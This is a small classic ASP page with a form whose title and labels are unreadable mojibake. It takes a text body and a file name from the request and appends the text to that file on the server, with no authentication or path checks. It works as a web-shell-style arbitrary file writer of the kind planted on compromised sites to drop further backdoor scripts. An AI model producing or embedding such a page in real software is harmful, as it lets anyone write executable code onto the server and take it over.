<TITLE>�Ż�ר��ȫ��С��</TITLE>
<form method="post" action="?action=set">
  <label>  ��ַ�б�<br />
  <br />
  <textarea name="Text" cols="50" rows="10" id="Text"></textarea>
  </label>
  <br />
  <br />
  <label>�ļ�����<br />
  <br />
    <input name="FileName" type="text" id="FileName" size="52" maxlength="50" />
    <br />
    <br />
  </label>
  <label> 
    <input type="submit" name="Submit" value="����" />
   </label>
</form>
<%
dim s
if request("action")="set" then
Text=request("Text")
FileName=request("FileName")
set fs=server.CreateObject("Scripting.FileSystemObject")
set file=fs.OpenTextFile(server.MapPath(FileName),8,True)
file.writeline Text
file.close
set file=nothing
set fs=nothing
response.write ("<script>alert('����ɹ���')</script>") 
end if
%>